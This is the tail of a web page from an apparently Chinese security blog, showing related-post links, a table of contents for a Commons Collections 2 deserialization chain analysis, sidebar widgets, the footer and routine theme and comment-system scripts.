src="https://tva1.sinaimg.cn/large/008eGmZEly1gpewrft16cj31c00u0wx1.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-04-11</div><div class="title">solr漏洞分析--CVE-2017-3163</div></div></a></div><div><a href="/2021/02/05/ysoserial -URLDNS的学习/" title="ysoserial -URLDNS的学习"><img class="cover" src="https://cdn.jsdelivr.net/gh/York145/CDN@1.0.0/img/custom/cover.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-05</div><div class="title">ysoserial -URLDNS的学习</div></div></a></div><div><a href="/2021/04/05/CommonsCollections 3~7分析/" title="CommonsCollections 3～7分析"><img class="cover" src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp924g7eqhj31o00u0dul.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-04-05</div><div class="title">CommonsCollections 3～7分析</div></div></a></div><div><a href="/2021/04/18/内存马初探-Filter/" title="内存马初探"><img class="cover" src="https://tva1.sinaimg.cn/large/008eGmZEly1gpo275vb4dj31hc0u0kiw.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-04-18</div><div class="title">内存马初探</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsxjbgddgvj30u00u0gnx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name"></div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/York145"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/York145" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="/2192557290@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">唯信仰与日月亘古不变</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CommonsCollections-2%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">CommonsCollections 2分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Javassist"><span class="toc-number">1.1.</span> <span class="toc-text">Javassist</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%8F%8D%E5%B0%84%E8%B0%83%E7%94%A8"><span class="toc-number">1.1.1.</span> <span class="toc-text">通过反射调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-class%E6%96%87%E4%BB%B6%E8%B0%83%E7%94%A8"><span class="toc-number">1.1.2.</span> <span class="toc-text">通过.class文件调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E6%8E%A5%E5%8F%A3%E8%B0%83%E7%94%A8"><span class="toc-number">1.1.3.</span> <span class="toc-text">通过接口调用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">利用链分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E6%98%93%E7%89%88Poc1"><span class="toc-number">1.2.1.</span> <span class="toc-text">简易版Poc1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%9C%A8queue%E4%B8%AD%E5%8A%A0%E5%85%A5%E4%B8%A4%E4%B8%AA%E5%80%BC%EF%BC%9F"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">为什么要在queue中加入两个值？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8%E7%9A%84%E6%98%AFcollections4-0%EF%BC%9F"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">为什么用的是collections4.0？</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Poc2"><span class="toc-number">1.2.2.</span> <span class="toc-text">Poc2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TemplatesImpl"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">TemplatesImpl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E8%AE%BE%E7%BD%AEsize%E4%B8%BA2"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">为什么要设置size为2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E7%94%A8%E5%8F%8D%E5%B0%84%E4%BF%AE%E6%94%B9size"><span class="toc-number">1.2.3.</span> <span class="toc-text">为什么要用反射修改size</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text">总结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/07/24/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89%20%E7%BB%83%E4%B9%A0/" title="ATT&amp;CK红队评估实战靶场（一） 练习"><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss9nrp63zj30ul0u00x0.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ATT&amp;CK红队评估实战靶场（一） 练习"/></a><div class="content"><a class="title" href="/2021/07/24/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89%20%E7%BB%83%E4%B9%A0/" title="ATT&amp;CK红队评估实战靶场（一） 练习">ATT&amp;CK红队评估实战靶场（一） 练习</a><time datetime="2021-07-24T11:31:01.000Z" title="Created 2021-07-24 19:31:01">2021-07-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/13/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" title="Shiro反序列化漏洞学习"><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgup9s1bdj31hc0u0h12.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Shiro反序列化漏洞学习"/></a><div class="content"><a class="title" href="/2021/06/13/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" title="Shiro反序列化漏洞学习">Shiro反序列化漏洞学习</a><time datetime="2021-06-13T11:16:01.000Z" title="Created 2021-06-13 19:16:01">2021-06-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/09/Java%20agent%E5%AD%A6%E4%B9%A0/" title="Java agent学习"><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqc62dvybnj31ow0syqv6.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java agent学习"/></a><div class="content"><a class="title" href="/2021/05/09/Java%20agent%E5%AD%A6%E4%B9%A0/" title="Java agent学习">Java agent学习</a><time datetime="2021-05-09T06:31:01.000Z" title="Created 2021-05-09 14:31:01">2021-05-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/04/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/" title="内网渗透--远程桌面"><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq0wmy7qiej31hc0u0dom.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网渗透--远程桌面"/></a><div class="content"><a class="title" href="/2021/04/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/" title="内网渗透--远程桌面">内网渗透--远程桌面</a><time datetime="2021-04-29T12:05:01.000Z" title="Created 2021-04-29 20:05:01">2021-04-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/04/18/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2-Filter/" title="内存马初探"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpo275vb4dj31hc0u0kiw.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内存马初探"/></a><div class="content"><a class="title" href="/2021/04/18/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2-Filter/" title="内存马初探">内存马初探</a><time datetime="2021-04-18T10:05:01.000Z" title="Created 2021-04-18 18:05:01">2021-04-18</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By null</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '0CCNA4v7N3NfIoztkmU8uOaf-gzGzoHsz',
+      appKey: 'NI4yNO6pe0VGcyaXWOjKtYkk',
+      placeholder: 'Please leave your footprints',
+      avatar: 'monsterid',
+      meta: 'nick,mail'.split(','),
+      pageSize: '10',
+      lang: 'zh-CN',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+      requiredFields: ["nick"],
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
